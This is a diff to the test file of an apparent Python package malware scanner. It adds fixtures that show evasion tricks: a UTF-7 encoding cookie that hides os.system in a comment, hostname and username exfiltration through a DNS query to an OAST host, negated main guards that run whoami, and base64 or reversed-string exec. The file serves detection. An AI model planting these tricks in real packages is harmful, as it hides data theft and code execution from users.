@@ -2,7 +2,7 @@ import textwrap
 
 import pytest
 
-from pkg_sentry.pyscan import local_imports, scan_python
+from pkg_sentry.pyscan import imports_of, scan_python
 
 
 def scan(code, role="runtime", path="pkg/mod.py"):
@@ -286,10 +286,10 @@ def test_normal_library_code(code):
     assert found in ([], ["shell"]), found
 
 
-def test_local_imports():
-    assert local_imports("from main import main\nimport os\nimport a.b as c\nfrom . import x") \
-        == {"main", "os", "a"}
-    assert local_imports("print 'py2'") == set()
+def test_imports_of():
+    found = imports_of("from main import main\nimport os\nimport a.b as c\nfrom . import x")
+    assert {(0, "main"), (0, "os"), (0, "a.b"), (1, "x")} <= found
+    assert imports_of("print 'py2'") == set()
 
 
 # Tricks found in the older half of the malware samples.
@@ -369,3 +369,39 @@ def test_hostname_inside_a_dns_query_is_a_beacon():
     found = scan("import socket, getpass\n"
                  "socket.gethostbyname(f'{getpass.getuser()}.{socket.gethostname()}.x.oast.fun')")
     assert any(f.rule == "recon" and f.value == 25 for f in found)
+
+
+def test_encoding_cookie_is_respected():
+    # In UTF-7, +AAo- is a newline, so this "comment" is really a line of code.
+    code = b"# coding: utf-7\nimport os\n#+AAo-os.system('id')\n"
+    assert "shell-at-install" in {f.rule for f in scan_python("pkg/mod.py", code, "setup")}
+
+
+def test_main_guard_written_backwards_or_negated():
+    found = scan('''
+        import subprocess
+        if "__main__" == __name__:
+            subprocess.run(["make"])
+        if __name__ != "__main__":
+            subprocess.run(["whoami"])
+    ''', role="import")
+    assert {(f.rule, f.line) for f in found} == {("shell", 4), ("shell-at-install", 6)}
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "import base64\ndef d(s):\n    return base64.b64decode(s)\nexec(d('eA=='))",
+        "exec('))(dlrow olleh(tnirp'[::-1])",
+        "import base64\nif (c := base64.b64decode('eA==')):\n    exec(c)",
+    ],
+)
+def test_decoding_hidden_behind_wrappers(code):
+    assert "exec-decoded" in rules(code, role="setup")
+
+
+def test_file_references():
+    from pkg_sentry.pyscan import file_references
+    refs = file_references("exec(open('a/b.py').read())\nrunpy.run_path('c.py')\n"
+                           "subprocess.call(['sh', 'install.sh'])")
+    assert {"a/b.py", "c.py", "install.sh"} <= refs
